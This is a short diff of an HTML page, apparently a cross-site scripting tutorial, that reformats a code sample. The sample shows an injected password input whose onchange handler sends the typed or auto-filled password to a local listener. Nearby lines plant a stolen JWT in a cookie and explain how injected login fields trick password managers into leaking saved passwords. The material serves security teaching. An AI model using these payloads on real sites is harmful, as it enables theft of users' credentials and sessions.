@@ -587,7 +587,8 @@ document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div></div>
             </div>
             <div class="terminal-window" style="margin:var(--space-2) 0;">
               <div class="terminal-window__body"><pre><code>&lt;input name=email&gt;
-&lt;input type=password onchange="fetch('http://localhost:9000/?pw='+this.value)"&gt;</code></pre></div>
+&lt;input type=password
+  onchange="fetch('http://localhost:9000/?pw='+this.value)"&gt;</code></pre></div>
             </div>
             <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0;">
               What if the session token is locked inside an <code>HttpOnly</code> cookie and you want the victim's actual password? Injecting a login input pair on the trusted domain tricks browser password managers into auto-filling their saved password and shipping it to your listener!
